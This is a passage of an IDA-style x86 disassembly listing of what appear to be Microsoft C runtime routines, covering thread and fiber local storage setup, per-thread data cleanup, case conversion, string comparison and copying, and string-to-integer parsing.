                push    [ebp+arg_0]
                push    dword_42AE4C
                call    sub_41217C
                pop     ecx
                call    eax
                pop     ebp
                retn    8
sub_41224B      endp


; =============== S U B R O U T I N E =======================================


sub_412268      proc near               ; CODE XREF: sub_4125BC:loc_41273F↓p
                mov     eax, dword_4257D8
                cmp     eax, 0FFFFFFFFh
                jz      short loc_412288
                push    eax
                push    dword_42AE50
                call    sub_41217C
                pop     ecx
                call    eax
                or      dword_4257D8, 0FFFFFFFFh

loc_412288:                             ; CODE XREF: sub_412268+8↑j
                mov     eax, dwTlsIndex
                cmp     eax, 0FFFFFFFFh
                jz      short loc_4122A0
                push    eax             ; dwTlsIndex
                call    ds:TlsFree
                or      dwTlsIndex, 0FFFFFFFFh

loc_4122A0:                             ; CODE XREF: sub_412268+28↑j
                jmp     sub_4167E2
sub_412268      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4122A5      proc near               ; CODE XREF: sub_40EA6D+53↑p
                                        ; sub_41238C+4F↓p ...

hModule         = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                push    0Ch
                push    offset stru_422DE8
                call    __SEH_prolog4
                mov     esi, offset aKernel32Dll_0 ; "KERNEL32.DLL"
                push    esi             ; lpModuleName
                call    ds:GetModuleHandleW
                test    eax, eax
                jnz     short loc_4122C8
                push    esi             ; lpModuleName
                call    sub_412D35
                pop     ecx

loc_4122C8:                             ; CODE XREF: sub_4122A5+1A↑j
                mov     [ebp+hModule], eax
                mov     esi, [ebp+arg_0]
                mov     dword ptr [esi+5Ch], offset unk_420490
                xor     edi, edi
                inc     edi
                mov     [esi+14h], edi
                test    eax, eax
                jz      short loc_412303
                push    offset aEncodepointer ; "EncodePointer"
                push    eax             ; hModule
                mov     ebx, ds:GetProcAddress
                call    ebx ; GetProcAddress
                mov     [esi+1F8h], eax
                push    offset aDecodepointer ; "DecodePointer"
                push    [ebp+hModule]   ; hModule
                call    ebx ; GetProcAddress
                mov     [esi+1FCh], eax

loc_412303:                             ; CODE XREF: sub_4122A5+38↑j
                mov     [esi+70h], edi
                mov     byte ptr [esi+0C8h], 43h
                mov     byte ptr [esi+14Bh], 43h
                mov     dword ptr [esi+68h], offset unk_4251C0
                push    0Dh
                call    sub_416913
                pop     ecx
                and     [ebp+ms_exc.registration.TryLevel], 0
                push    dword ptr [esi+68h] ; lpAddend
                call    ds:InterlockedIncrement
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_41237A
; ---------------------------------------------------------------------------

loc_41233C:                             ; CODE XREF: sub_4122A5+DD↓j
                push    0Ch
                call    sub_416913
                pop     ecx
                mov     [ebp+ms_exc.registration.TryLevel], edi
                mov     eax, [ebp+arg_4]
                mov     [esi+6Ch], eax
                test    eax, eax
                jnz     short loc_412359
                mov     eax, off_4257C8
                mov     [esi+6Ch], eax

loc_412359:                             ; CODE XREF: sub_4122A5+AA↑j
                push    dword ptr [esi+6Ch] ; lpAddend
                call    sub_411F25
                pop     ecx
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_412383
; ---------------------------------------------------------------------------

loc_41236E:                             ; CODE XREF: sub_4122A5+E6↓j
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_412374:                             ; DATA XREF: .rdata:stru_422DE8↓o
                xor     edi, edi
                inc     edi
                mov     esi, [ebp+arg_0]

loc_41237A:                             ; CODE XREF: sub_4122A5+92↑j
                push    0Dh
                call    sub_416839
                pop     ecx
                retn
; ---------------------------------------------------------------------------

loc_412383:                             ; CODE XREF: sub_4122A5+C4↑j
                                        ; DATA XREF: .rdata:stru_422DE8↓o
                push    0Ch
                call    sub_416839
                pop     ecx
                retn
sub_4122A5      endp


; =============== S U B R O U T I N E =======================================


sub_41238C      proc near               ; CODE XREF: sub_40E96C:loc_40E98F↑p
                                        ; sub_41090E↑p ...
                mov     edi, edi
                push    esi
                push    edi
                call    ds:GetLastError
                push    dword_4257D8
                mov     edi, eax
                call    sub_412217
                call    eax
                mov     esi, eax
                test    esi, esi
                jnz     short loc_4123F9
                push    214h
                push    1
                call    sub_412BF8
                mov     esi, eax
                pop     ecx
                pop     ecx
                test    esi, esi
                jz      short loc_4123F9
                push    esi
                push    dword_4257D8
                push    dword_42AE4C
                call    sub_41217C
                pop     ecx
                call    eax
                test    eax, eax
                jz      short loc_4123F0
                push    0
                push    esi
                call    sub_4122A5
                pop     ecx
                pop     ecx
                call    ds:GetCurrentThreadId
                or      dword ptr [esi+4], 0FFFFFFFFh
                mov     [esi], eax
                jmp     short loc_4123F9
; ---------------------------------------------------------------------------

loc_4123F0:                             ; CODE XREF: sub_41238C+4A↑j
                push    esi             ; lpMem
                call    sub_40FD55
                pop     ecx
                xor     esi, esi

loc_4123F9:                             ; CODE XREF: sub_41238C+1D↑j
                                        ; sub_41238C+31↑j ...
                push    edi             ; dwErrCode
                call    ds:SetLastError
                pop     edi
                mov     eax, esi
                pop     esi
                retn
sub_41238C      endp


; =============== S U B R O U T I N E =======================================


sub_412405      proc near               ; CODE XREF: sub_40E461+13↑p
                                        ; sub_40E9A9+C↑p ...
                mov     edi, edi
                push    esi
                call    sub_41238C
                mov     esi, eax
                test    esi, esi
                jnz     short loc_41241B
                push    10h
                call    sub_412D65
                pop     ecx

loc_41241B:                             ; CODE XREF: sub_412405+C↑j
                mov     eax, esi
                pop     esi
                retn
sub_412405      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __stdcall sub_41241F(LPVOID lpMem)
sub_41241F      proc near               ; CODE XREF: StartAddress+5A↑p
                                        ; sub_41254E+54↓p
                                        ; DATA XREF: ...

ms_exc          = CPPEH_RECORD ptr -18h
lpMem           = dword ptr  8

                push    8
                push    offset stru_422E10
                call    __SEH_prolog4
                mov     esi, [ebp+lpMem]
                test    esi, esi
                jz      loc_41252E
                mov     eax, [esi+24h]
                test    eax, eax
                jz      short loc_412444
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_412444:                             ; CODE XREF: sub_41241F+1C↑j
                mov     eax, [esi+2Ch]
                test    eax, eax
                jz      short loc_412452
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_412452:                             ; CODE XREF: sub_41241F+2A↑j
                mov     eax, [esi+34h]
                test    eax, eax
                jz      short loc_412460
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_412460:                             ; CODE XREF: sub_41241F+38↑j
                mov     eax, [esi+3Ch]
                test    eax, eax
                jz      short loc_41246E
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_41246E:                             ; CODE XREF: sub_41241F+46↑j
                mov     eax, [esi+40h]
                test    eax, eax
                jz      short loc_41247C
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_41247C:                             ; CODE XREF: sub_41241F+54↑j
                mov     eax, [esi+44h]
                test    eax, eax
                jz      short loc_41248A
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_41248A:                             ; CODE XREF: sub_41241F+62↑j
                mov     eax, [esi+48h]
                test    eax, eax
                jz      short loc_412498
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_412498:                             ; CODE XREF: sub_41241F+70↑j
                mov     eax, [esi+5Ch]
                cmp     eax, offset unk_420490
                jz      short loc_4124A9
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_4124A9:                             ; CODE XREF: sub_41241F+81↑j
                push    0Dh
                call    sub_416913
                pop     ecx
                and     [ebp+ms_exc.registration.TryLevel], 0
                mov     edi, [esi+68h]
                test    edi, edi
                jz      short loc_4124D6
                push    edi             ; lpAddend
                call    ds:InterlockedDecrement
                test    eax, eax
                jnz     short loc_4124D6
                cmp     edi, offset unk_4251C0
                jz      short loc_4124D6
                push    edi             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_4124D6:                             ; CODE XREF: sub_41241F+9B↑j
                                        ; sub_41241F+A6↑j ...
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_412539
; ---------------------------------------------------------------------------

loc_4124E2:                             ; CODE XREF: sub_41241F+122↓j
                push    0Ch
                call    sub_416913
                pop     ecx
                mov     [ebp+ms_exc.registration.TryLevel], 1
                mov     edi, [esi+6Ch]
                test    edi, edi
                jz      short loc_41251B
                push    edi             ; lpAddend
                call    sub_411FB4
                pop     ecx
                cmp     edi, off_4257C8
                jz      short loc_41251B
                cmp     edi, offset unk_4256F0
                jz      short loc_41251B
                cmp     dword ptr [edi], 0
                jnz     short loc_41251B
                push    edi             ; lpMem
                call    sub_411DDC
                pop     ecx

loc_41251B:                             ; CODE XREF: sub_41241F+D7↑j
                                        ; sub_41241F+E6↑j ...
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_412545
; ---------------------------------------------------------------------------

loc_412527:                             ; CODE XREF: sub_41241F+12E↓j
                push    esi             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_41252E:                             ; CODE XREF: sub_41241F+11↑j
                call    __SEH_epilog4
                retn    4
; ---------------------------------------------------------------------------

loc_412536:                             ; DATA XREF: .rdata:stru_422E10↓o
                mov     esi, [ebp+lpMem]

loc_412539:                             ; CODE XREF: sub_41241F+BE↑j
                push    0Dh
                call    sub_416839
                pop     ecx
                retn
; ---------------------------------------------------------------------------

loc_412542:                             ; DATA XREF: .rdata:stru_422E10↓o
                mov     esi, [ebp+lpMem]

loc_412545:                             ; CODE XREF: sub_41241F+103↑j
                push    0Ch
                call    sub_416839
                pop     ecx
                retn
sub_41241F      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_41254E(LPVOID lpMem)
sub_41254E      proc near               ; CODE XREF: sub_40E96C+2D↑p

lpMem           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                cmp     dword_4257D8, 0FFFFFFFFh
                jz      short loc_4125A7
                cmp     [ebp+lpMem], 0
                jnz     short loc_412589
                push    esi
                push    dwTlsIndex      ; dwTlsIndex
                mov     esi, ds:TlsGetValue
                call    esi ; TlsGetValue
                test    eax, eax
                jz      short loc_412588
                push    dword_4257D8
                push    dwTlsIndex      ; dwTlsIndex
                call    esi ; TlsGetValue
                call    eax
                mov     [ebp+lpMem], eax

loc_412588:                             ; CODE XREF: sub_41254E+25↑j
                pop     esi

loc_412589:                             ; CODE XREF: sub_41254E+12↑j
                push    0
                push    dword_4257D8
                push    dword_42AE4C
                call    sub_41217C
                pop     ecx
                call    eax
                push    [ebp+lpMem]     ; lpMem
                call    sub_41241F

loc_4125A7:                             ; CODE XREF: sub_41254E+C↑j
                mov     eax, dwTlsIndex
                cmp     eax, 0FFFFFFFFh
                jz      short loc_4125BA
                push    0               ; lpTlsValue
                push    eax             ; dwTlsIndex
                call    ds:TlsSetValue

loc_4125BA:                             ; CODE XREF: sub_41254E+61↑j
                pop     ebp
                retn
sub_41254E      endp


; =============== S U B R O U T I N E =======================================


sub_4125BC      proc near               ; CODE XREF: start:loc_4101AA↑p
                mov     edi, edi
                push    esi
                push    edi
                mov     esi, offset aKernel32Dll_0 ; "KERNEL32.DLL"
                push    esi             ; lpModuleName
                call    ds:GetModuleHandleW
                test    eax, eax
                jnz     short loc_4125D7
                push    esi             ; lpModuleName
                call    sub_412D35
                pop     ecx

loc_4125D7:                             ; CODE XREF: sub_4125BC+12↑j
                mov     edi, eax
                test    edi, edi
                jz      loc_41273F
                mov     esi, ds:GetProcAddress
                push    offset aFlsalloc ; "FlsAlloc"
                push    edi             ; hModule
                call    esi ; GetProcAddress
                push    offset aFlsgetvalue ; "FlsGetValue"
                push    edi             ; hModule
                mov     dword_42AE44, eax
                call    esi ; GetProcAddress
                push    offset aFlssetvalue ; "FlsSetValue"
                push    edi             ; hModule
                mov     lpTlsValue, eax
                call    esi ; GetProcAddress
                push    offset aFlsfree ; "FlsFree"
                push    edi             ; hModule
                mov     dword_42AE4C, eax
                call    esi ; GetProcAddress
                cmp     dword_42AE44, 0
                mov     esi, ds:TlsSetValue
                mov     dword_42AE50, eax
                jz      short loc_412640
                cmp     lpTlsValue, 0
                jz      short loc_412640
                cmp     dword_42AE4C, 0
                jz      short loc_412640
                test    eax, eax
                jnz     short loc_412664

loc_412640:                             ; CODE XREF: sub_4125BC+6C↑j
                                        ; sub_4125BC+75↑j ...
                mov     eax, ds:TlsGetValue
                mov     lpTlsValue, eax
                mov     eax, ds:TlsFree
                mov     dword_42AE44, offset sub_4121EE
                mov     dword_42AE4C, esi
                mov     dword_42AE50, eax

loc_412664:                             ; CODE XREF: sub_4125BC+82↑j
                call    ds:TlsAlloc
                mov     dwTlsIndex, eax
                cmp     eax, 0FFFFFFFFh
                jz      loc_412744
                push    lpTlsValue      ; lpTlsValue
                push    eax             ; dwTlsIndex
                call    esi ; TlsSetValue
                test    eax, eax
                jz      loc_412744
                call    sub_41301F
                push    dword_42AE44
                call    sub_412101
                push    lpTlsValue
                mov     dword_42AE44, eax
                call    sub_412101
                push    dword_42AE4C
                mov     lpTlsValue, eax
                call    sub_412101
                push    dword_42AE50
                mov     dword_42AE4C, eax
                call    sub_412101
                add     esp, 10h
                mov     dword_42AE50, eax
                call    sub_416797
                test    eax, eax
                jz      short loc_41273F
                push    offset sub_41241F
                push    dword_42AE44
                call    sub_41217C
                pop     ecx
                call    eax
                mov     dword_4257D8, eax
                cmp     eax, 0FFFFFFFFh
                jz      short loc_41273F
                push    214h
                push    1
                call    sub_412BF8
                mov     esi, eax
                pop     ecx
                pop     ecx
                test    esi, esi
                jz      short loc_41273F
                push    esi
                push    dword_4257D8
                push    dword_42AE4C
                call    sub_41217C
                pop     ecx
                call    eax
                test    eax, eax
                jz      short loc_41273F
                push    0
                push    esi
                call    sub_4122A5
                pop     ecx
                pop     ecx
                call    ds:GetCurrentThreadId
                or      dword ptr [esi+4], 0FFFFFFFFh
                mov     [esi], eax
                xor     eax, eax
                inc     eax
                jmp     short loc_412746
; ---------------------------------------------------------------------------

loc_41273F:                             ; CODE XREF: sub_4125BC+1F↑j
                                        ; sub_4125BC+11C↑j ...
                call    sub_412268

loc_412744:                             ; CODE XREF: sub_4125BC+B6↑j
                                        ; sub_4125BC+C7↑j
                xor     eax, eax

loc_412746:                             ; CODE XREF: sub_4125BC+181↑j
                pop     edi
                pop     esi
                retn
sub_4125BC      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_412749      proc near               ; CODE XREF: sub_40E4E8+BD↑p
                                        ; sub_40E4E8+CF↑p ...

var_18          = dword ptr -18h
var_10          = dword ptr -10h
var_C           = byte ptr -0Ch
DestStr         = word ptr -8
MultiByteStr    = byte ptr -4
var_3           = byte ptr -3
var_2           = byte ptr -2
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 18h
                push    ebx
                push    esi
                push    [ebp+arg_4]
                lea     ecx, [ebp+var_18]
                call    sub_40E461
                mov     ebx, [ebp+arg_0]
                mov     esi, 100h
                cmp     ebx, esi
                jnb     short loc_4127BE
                mov     ecx, [ebp+var_18]
                cmp     dword ptr [ecx+0ACh], 1
                jle     short loc_41278A
                lea     eax, [ebp+var_18]
                push    eax
                push    1
                push    ebx
                call    sub_413CA3
                mov     ecx, [ebp+var_18]
                add     esp, 0Ch
                jmp     short loc_412797
; ---------------------------------------------------------------------------

loc_41278A:                             ; CODE XREF: sub_412749+2B↑j
                mov     eax, [ecx+0C8h]
                movzx   eax, word ptr [eax+ebx*2]
                and     eax, 1

loc_412797:                             ; CODE XREF: sub_412749+3F↑j
                test    eax, eax
                jz      short loc_4127AA
                mov     eax, [ecx+0CCh]
                movzx   eax, byte ptr [eax+ebx]
                jmp     loc_41284D
; ---------------------------------------------------------------------------

loc_4127AA:                             ; CODE XREF: sub_412749+50↑j
                                        ; sub_412749+EC↓j
                cmp     [ebp+var_C], 0
                jz      short loc_4127B7
                mov     eax, [ebp+var_10]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_4127B7:                             ; CODE XREF: sub_412749+65↑j
                mov     eax, ebx
                jmp     loc_41285A
; ---------------------------------------------------------------------------

loc_4127BE:                             ; CODE XREF: sub_412749+1F↑j
                mov     eax, [ebp+var_18]
                cmp     dword ptr [eax+0ACh], 1
                jle     short loc_4127FB
                mov     [ebp+arg_0], ebx
                sar     [ebp+arg_0], 8
                lea     eax, [ebp+var_18]
                push    eax
                mov     eax, [ebp+arg_0]
                and     eax, 0FFh
                push    eax
                call    sub_418D37
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      short loc_4127FB
                mov     al, byte ptr [ebp+arg_0]
                push    2
                mov     [ebp+MultiByteStr], al
                mov     [ebp+var_3], bl
                mov     [ebp+var_2], 0
                pop     ecx
                jmp     short loc_412810
; ---------------------------------------------------------------------------

loc_4127FB:                             ; CODE XREF: sub_412749+7F↑j
                                        ; sub_412749+9E↑j
                call    sub_41090E
                mov     dword ptr [eax], 2Ah
                xor     ecx, ecx
                mov     [ebp+MultiByteStr], bl
                mov     [ebp+var_3], 0
                inc     ecx

loc_412810:                             ; CODE XREF: sub_412749+B0↑j
                mov     eax, [ebp+var_18]
                push    1               ; int
                push    dword ptr [eax+4] ; CodePage
                lea     edx, [ebp+DestStr]
                push    3               ; cchDest
                push    edx             ; lpDestStr
                push    ecx             ; cbMultiByte
                lea     ecx, [ebp+MultiByteStr]
                push    ecx             ; lpMultiByteStr
                push    esi             ; dwMapFlags
                push    dword ptr [eax+14h] ; Locale
                lea     eax, [ebp+var_18]
                push    eax             ; int
                call    sub_4191EA
                add     esp, 24h
                test    eax, eax
                jz      loc_4127AA
                cmp     eax, 1
                movzx   eax, byte ptr [ebp+DestStr]
                jz      short loc_41284D
                movzx   ecx, byte ptr [ebp+DestStr+1]
                shl     eax, 8
                or      eax, ecx

loc_41284D:                             ; CODE XREF: sub_412749+5C↑j
                                        ; sub_412749+F9↑j
                cmp     [ebp+var_C], 0
                jz      short loc_41285A
                mov     ecx, [ebp+var_10]
                and     dword ptr [ecx+70h], 0FFFFFFFDh

loc_41285A:                             ; CODE XREF: sub_412749+70↑j
                                        ; sub_412749+108↑j
                pop     esi
                pop     ebx
                leave
                retn
sub_412749      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41285E      proc near               ; CODE XREF: sub_41B924+1B↓p
                                        ; sub_41B924+38↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                cmp     dword_42AE20, 0
                jnz     short loc_41287C
                mov     eax, [ebp+arg_0]
                lea     ecx, [eax-41h]
                cmp     ecx, 19h
                ja      short loc_412888
                add     eax, 20h
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_41287C:                             ; CODE XREF: sub_41285E+C↑j
                push    0
                push    [ebp+arg_0]
                call    sub_412749
                pop     ecx
                pop     ecx

loc_412888:                             ; CODE XREF: sub_41285E+17↑j
                pop     ebp
                retn
sub_41285E      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_412890      proc near               ; CODE XREF: sub_40E4E8+9C↑p
                                        ; sub_40E5DA+44↑j

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                push    ebp
                mov     ebp, esp
                push    edi
                push    esi
                push    ebx
                mov     ecx, [ebp+arg_8]
                or      ecx, ecx
                jz      short loc_4128EA
                mov     esi, [ebp+arg_0]
                mov     edi, [ebp+arg_4]
                mov     bh, 41h
                mov     bl, 5Ah
                mov     dh, 20h
                lea     ecx, [ecx+0]

loc_4128AC:                             ; CODE XREF: sub_412890+49↓j
                mov     ah, [esi]
                or      ah, ah
                mov     al, [edi]
                jz      short loc_4128DB
                or      al, al
                jz      short loc_4128DB
                add     esi, 1
                add     edi, 1
                cmp     ah, bh
                jb      short loc_4128C8
                cmp     ah, bl
                ja      short loc_4128C8
                add     ah, dh

loc_4128C8:                             ; CODE XREF: sub_412890+30↑j
                                        ; sub_412890+34↑j
                cmp     al, bh
                jb      short loc_4128D2
                cmp     al, bl
                ja      short loc_4128D2
                add     al, dh

loc_4128D2:                             ; CODE XREF: sub_412890+3A↑j
                                        ; sub_412890+3E↑j
                cmp     ah, al
                jnz     short loc_4128E1
                sub     ecx, 1
                jnz     short loc_4128AC

loc_4128DB:                             ; CODE XREF: sub_412890+22↑j
                                        ; sub_412890+26↑j
                xor     ecx, ecx
                cmp     ah, al
                jz      short loc_4128EA

loc_4128E1:                             ; CODE XREF: sub_412890+44↑j
                mov     ecx, 0FFFFFFFFh
                jb      short loc_4128EA
                neg     ecx

loc_4128EA:                             ; CODE XREF: sub_412890+B↑j
                                        ; sub_412890+4F↑j ...
                mov     eax, ecx
                pop     ebx
                pop     esi
                pop     edi
                leave
                retn
sub_412890      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4128F1      proc near               ; CODE XREF: sub_40E649+35↑p
                                        ; sub_40E6B9+41↑p ...

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, [ebp+arg_0]
                push    ebx
                xor     ebx, ebx
                push    esi
                push    edi
                cmp     ecx, ebx
                jz      short loc_412909
                mov     edi, [ebp+arg_4]
                cmp     edi, ebx
                ja      short loc_412924

loc_412909:                             ; CODE XREF: sub_4128F1+F↑j
                                        ; sub_4128F1+3C↓j
                call    sub_41090E
                push    16h
                pop     esi
                mov     [eax], esi

loc_412913:                             ; CODE XREF: sub_4128F1+5F↓j
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                call    sub_40EC54
                add     esp, 14h
                mov     eax, esi
                jmp     short loc_412954
; ---------------------------------------------------------------------------

loc_412924:                             ; CODE XREF: sub_4128F1+16↑j
                mov     esi, [ebp+arg_8]
                cmp     esi, ebx
                jnz     short loc_41292F
                mov     [ecx], bl
                jmp     short loc_412909
; ---------------------------------------------------------------------------

loc_41292F:                             ; CODE XREF: sub_4128F1+38↑j
                mov     edx, ecx

loc_412931:                             ; CODE XREF: sub_4128F1+4B↓j
                mov     al, [esi]
                mov     [edx], al
                inc     edx
                inc     esi
                cmp     al, bl
                jz      short loc_41293E
                dec     edi
                jnz     short loc_412931

loc_41293E:                             ; CODE XREF: sub_4128F1+48↑j
                cmp     edi, ebx
                jnz     short loc_412952
                mov     [ecx], bl
                call    sub_41090E
                push    22h
                pop     ecx
                mov     [eax], ecx
                mov     esi, ecx
                jmp     short loc_412913
; ---------------------------------------------------------------------------

loc_412952:                             ; CODE XREF: sub_4128F1+4F↑j
                xor     eax, eax

loc_412954:                             ; CODE XREF: sub_4128F1+31↑j
                pop     edi
                pop     esi
                pop     ebx
                pop     ebp
                retn
sub_4128F1      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_412959      proc near               ; CODE XREF: sub_412B88:loc_412BA9↓p

var_14          = dword ptr -14h
var_C           = dword ptr -0Ch
var_8           = byte ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 14h
                push    esi
                push    edi
                push    [ebp+arg_0]
                lea     ecx, [ebp+var_14]
                call    sub_40E461
                mov     eax, [ebp+arg_8]
                mov     esi, [ebp+arg_4]
                xor     edi, edi
                cmp     eax, edi
                jz      short loc_41297C
                mov     [eax], esi

loc_41297C:                             ; CODE XREF: sub_412959+1F↑j
                cmp     esi, edi
                jnz     short loc_4129AC

loc_412980:                             ; CODE XREF: sub_412959+5C↓j
                                        ; sub_412959+62↓j
                call    sub_41090E
                push    edi
                push    edi
                push    edi
                push    edi
                push    edi
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                cmp     [ebp+var_8], 0
                jz      short loc_4129A5
                mov     eax, [ebp+var_C]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_4129A5:                             ; CODE XREF: sub_412959+43↑j
                xor     eax, eax
                jmp     loc_412B84
; ---------------------------------------------------------------------------

loc_4129AC:                             ; CODE XREF: sub_412959+25↑j
                cmp     [ebp+arg_C], edi
                jz      short loc_4129BD
                cmp     [ebp+arg_C], 2
                jl      short loc_412980
                cmp     [ebp+arg_C], 24h
                jg      short loc_412980

loc_4129BD:                             ; CODE XREF: sub_412959+56↑j
                mov     ecx, [ebp+var_14]
                push    ebx
                mov     bl, [esi]
                mov     [ebp+var_4], edi
                lea     edi, [esi+1]

loc_4129C9:                             ; CODE XREF: sub_412959+A7↓j
                cmp     dword ptr [ecx+0ACh], 1
                jle     short loc_4129E9
                lea     eax, [ebp+var_14]
                push    eax
                movzx   eax, bl
                push    8
                push    eax
                call    sub_413CA3
                mov     ecx, [ebp+var_14]
                add     esp, 0Ch
                jmp     short loc_4129F9
; ---------------------------------------------------------------------------

loc_4129E9:                             ; CODE XREF: sub_412959+77↑j
                mov     edx, [ecx+0C8h]
                movzx   eax, bl
                movzx   eax, word ptr [edx+eax*2]
                and     eax, 8

loc_4129F9:                             ; CODE XREF: sub_412959+8E↑j
                test    eax, eax
                jz      short loc_412A02
                mov     bl, [edi]
                inc     edi
                jmp     short loc_4129C9
; ---------------------------------------------------------------------------

loc_412A02:                             ; CODE XREF: sub_412959+A2↑j
                cmp     bl, 2Dh
                jnz     short loc_412A0D
                or      [ebp+arg_10], 2
                jmp     short loc_412A12
; ---------------------------------------------------------------------------

loc_412A0D:                             ; CODE XREF: sub_412959+AC↑j
                cmp     bl, 2Bh
                jnz     short loc_412A15

loc_412A12:                             ; CODE XREF: sub_412959+B2↑j
                mov     bl, [edi]
                inc     edi

loc_412A15:                             ; CODE XREF: sub_412959+B7↑j
                mov     eax, [ebp+arg_C]
                test    eax, eax
                jl      loc_412B6B
                cmp     eax, 1
                jz      loc_412B6B
                cmp     eax, 24h
                jg      loc_412B6B
                test    eax, eax
                jnz     short loc_412A60
                cmp     bl, 30h
                jz      short loc_412A44
                mov     [ebp+arg_C], 0Ah
                jmp     short loc_412A78
; ---------------------------------------------------------------------------

loc_412A44:                             ; CODE XREF: sub_412959+E0↑j
                mov     al, [edi]
                cmp     al, 78h
                jz      short loc_412A57
                cmp     al, 58h
                jz      short loc_412A57
                mov     [ebp+arg_C], 8
                jmp     short loc_412A78
; ---------------------------------------------------------------------------

loc_412A57:                             ; CODE XREF: sub_412959+EF↑j
                                        ; sub_412959+F3↑j
                mov     [ebp+arg_C], 10h
                jmp     short loc_412A6A
; ---------------------------------------------------------------------------

loc_412A60:                             ; CODE XREF: sub_412959+DB↑j
                cmp     eax, 10h
                jnz     short loc_412A78
                cmp     bl, 30h
                jnz     short loc_412A78

loc_412A6A:                             ; CODE XREF: sub_412959+105↑j
                mov     al, [edi]
                cmp     al, 78h
                jz      short loc_412A74
                cmp     al, 58h
                jnz     short loc_412A78

loc_412A74:                             ; CODE XREF: sub_412959+115↑j
                inc     edi
                mov     bl, [edi]
                inc     edi

loc_412A78:                             ; CODE XREF: sub_412959+E9↑j
                                        ; sub_412959+FC↑j ...
                mov     esi, [ecx+0C8h]
                mov     eax, 0FFFFFFFFh
                xor     edx, edx
                div     [ebp+arg_C]

loc_412A88:                             ; CODE XREF: sub_412959+1A2↓j
                movzx   ecx, bl
                movzx   ecx, word ptr [esi+ecx*2]
                test    cl, 4
                jz      short loc_412A9C
                movsx   ecx, bl
                sub     ecx, 30h
                jmp     short loc_412AB7
; ---------------------------------------------------------------------------

loc_412A9C:                             ; CODE XREF: sub_412959+139↑j
                test    ecx, 103h
                jz      short loc_412AD5
                mov     cl, bl
                sub     cl, 61h
                cmp     cl, 19h
                movsx   ecx, bl
                ja      short loc_412AB4
                sub     ecx, 20h

loc_412AB4:                             ; CODE XREF: sub_412959+156↑j
                add     ecx, 0FFFFFFC9h

loc_412AB7:                             ; CODE XREF: sub_412959+141↑j
                cmp     ecx, [ebp+arg_C]
                jnb     short loc_412AD5
                or      [ebp+arg_10], 8
                cmp     [ebp+var_4], eax
                jb      short loc_412AEC
                jnz     short loc_412ACB
                cmp     ecx, edx
                jbe     short loc_412AEC

loc_412ACB:                             ; CODE XREF: sub_412959+16C↑j
                or      [ebp+arg_10], 4
                cmp     [ebp+arg_8], 0
                jnz     short loc_412AF8

loc_412AD5:                             ; CODE XREF: sub_412959+149↑j
                                        ; sub_412959+161↑j
                mov     eax, [ebp+arg_10]
                dec     edi
                test    al, 8
                jnz     short loc_412AFD
                cmp     [ebp+arg_8], 0
                jz      short loc_412AE6
                mov     edi, [ebp+arg_4]

loc_412AE6:                             ; CODE XREF: sub_412959+188↑j
                and     [ebp+var_4], 0
                jmp     short loc_412B47
; ---------------------------------------------------------------------------

loc_412AEC:                             ; CODE XREF: sub_412959+16A↑j
                                        ; sub_412959+170↑j
                mov     ebx, [ebp+var_4]
                imul    ebx, [ebp+arg_C]
                add     ebx, ecx
                mov     [ebp+var_4], ebx

loc_412AF8:                             ; CODE XREF: sub_412959+17A↑j
                mov     bl, [edi]
                inc     edi
                jmp     short loc_412A88
; ---------------------------------------------------------------------------

loc_412AFD:                             ; CODE XREF: sub_412959+182↑j
                mov     esi, 7FFFFFFFh
                test    al, 4
                jnz     short loc_412B21
                test    al, 1
                jnz     short loc_412B47
                and     eax, 2
                jz      short loc_412B18
                cmp     [ebp+var_4], 80000000h
                ja      short loc_412B21

loc_412B18:                             ; CODE XREF: sub_412959+1B4↑j
                test    eax, eax
                jnz     short loc_412B47
                cmp     [ebp+var_4], esi
                jbe     short loc_412B47

